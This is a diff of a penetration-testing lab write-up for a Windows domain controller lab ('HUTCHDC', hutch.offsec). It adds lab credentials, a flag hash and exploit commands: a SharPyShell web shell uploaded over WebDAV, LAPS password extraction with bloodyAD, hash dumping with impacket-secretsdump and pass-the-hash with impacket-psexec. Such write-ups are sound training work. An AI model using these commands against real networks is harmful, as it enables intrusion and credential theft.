@@ -1,13 +1,14 @@
 **Metadata**
 
-- IP Address:  192.168.
+- IP Address:  192.168.240.122
 - Hostname: HUTCHDC
 - OS:  Server 2019 Build 17763 x64
 - Found Credentials/Users:
+	fmcsorley / CrabSharkJellyfish192
 
 Main Objectives:
 
-Local.txt = 
+Local.txt = bbfc4572e16a44136f31b3298326d57f
 Proof.txt = 
 
 **Enumeration**
@@ -78,60 +79,7 @@ PORT      STATE SERVICE       VERSION
 
 ```
 
-3. FTP Enumeration
-
-```
-nmap -p 21 -sS --open <IP>
-
-nc <IP> 21
-
-nmap -p 21 -sV <IP>
-
-ftp <IP>
-
-Credentials to try:
-
-Username: anonymous
-Password: anonymous
-
-or any password
-
-After login:
-
-ls
-pwd
-cd /
-cd pub
-binary
-passive
-
----
-
-Anonymous Upload Test
-
-Create a test file:
-
-echo test > test.txt
-
-Upload:
-
-put test.txt
-
----
-
-Download Everything (Loot First)
-
-From local machine:
-
-wget -r ftp://anonymous:anonymous@<IP>/
-
-From ftp client:
-
-prompt
-mget *
-```
-
-4. Web Enumeration 
+3. Web Enumeration 
 
 ```
 whatweb -v http://192.168.162.122
@@ -469,7 +417,7 @@ LDAP        192.168.162.122 389    HUTCHDC          Protected Users             
 LDAP        192.168.162.122 389    HUTCHDC          DnsAdmins                                membercount: 0
 LDAP        192.168.162.122 389    HUTCHDC          DnsUpdateProxy                           membercount: 0
 
-bloodhound-ce-python -d hutch.offsec -u '<username>' -p '<password>' -ns
+bloodhound-ce-python -d hutch.offsec -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns
 192.168.162.122 -c all --zip
 # Bloodhound Data Collection
 ```
@@ -528,11 +476,33 @@ LIMIT 1000
 
 1. Exploit Steps
 
+- Using the discovered username and password, exploited open webdav using cadver.
+
+![[Pasted image 20260203102110.png]]
+
+- Created a webshell using sharpyshell.py.
+
+
+```
+cd ~/Tools/ExploitTools/SharPyShell
+source .venv/bin/activate
+python3 SharPyShell.py generate -p <password>
+
 ```
 
+- Uploaded webshell via webdav using cadver.
 
+![[Pasted image 20260203102512.png]]
+
+- Interacted to with webshell using sharpyshell.py. 
 
 ```
+python3 SharPyShell.py interact -u http://192.168.240.122/sharpyshell.aspx -p P@55w0rd
+```
+
+- Received shell.
+
+![[Pasted image 20260203103007.png]]
 
 2. Shell Access
 
@@ -687,7 +657,7 @@ Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction Silently
 
 ```
 
-
+- Read LAPs Password
 
 ```
 
@@ -695,9 +665,29 @@ Get-ChildItem C:\ -Recurse -Include *pass*,*cred*,*secret* -ErrorAction Silently
 
 1. PE Steps
 
-```
+-  Used bloodAD to read the LAPs password.
 
 ```
+bloodyAD --host 192.168.240.122 -d 'offsec' -u 'fmcsorley' -p 'CrabSharkJellyfish192' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
+```
+
+![[Pasted image 20260203131809.png]]
+
+- Used impacket-secretsdump to dump password hashes with Administrator account and password. 
+
+```
+impacket-secretsdump Administrator@192.168.240.122
+```
+
+![[Pasted image 20260203131948.png]]
+
+- Used impacket-psexec to login with domainadmin hash.
+
+```
+impacket-psexec offsec/domainadmin@192.168.240.122 -hashes aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7 
+```
+
+![[Pasted image 20260203132130.png]]
 
 2. Notes
 
